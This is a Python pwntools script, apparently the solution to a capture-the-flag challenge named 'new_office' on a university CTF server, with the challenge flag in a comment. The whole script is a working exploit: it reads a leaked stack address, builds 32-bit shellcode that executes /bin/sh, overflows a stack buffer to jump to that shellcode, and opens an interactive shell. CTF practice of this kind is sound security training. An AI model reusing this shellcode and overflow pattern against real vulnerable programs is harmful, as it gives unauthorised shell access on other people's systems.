#!/usr/bin/python3

# SKYLIGHT{3x3CuTe_0ff1cE_5TACK}

from pwn import *
PROG_NAME = "./new_office"
REMOTE_IP = "pwn.ctf.unswsecurity.com"
REMOTE_PORT = 5001

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
else:
    p = process(PROG_NAME)
    elf = p.elf

if args.ATTACH:
	gdb.attach(p, '''break main''')

p.recvlines(2)
stack_addr = int(p.recvline().rstrip().split()[-1], 16)

shellcode = asm(""" xor eax, eax
                    xor ecx, ecx
                    xor edx, edx
                    push ecx
                    push 0x68732f2f
                    push 0x6e69622f
                    mov al, 0x0b
                    mov ebx, esp
                    int 0x80 """)

payload = shellcode + b'A' * (0x3a+4-len(shellcode)) + p32(stack_addr)

p.sendline(payload)

p.interactive()